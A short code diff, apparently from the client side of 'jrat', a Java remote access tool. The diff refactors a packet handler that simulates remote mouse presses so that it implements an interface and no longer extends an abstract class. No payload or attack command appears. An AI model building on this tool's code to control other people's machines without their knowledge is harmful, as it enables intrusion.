@@ -3,7 +3,7 @@ package jrat.client.packets.incoming;
 import jrat.client.Connection;
 import jrat.client.utils.ScreenUtils;
 
-public class Packet92MousePress extends AbstractIncomingPacket {
+public class Packet92MousePress implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
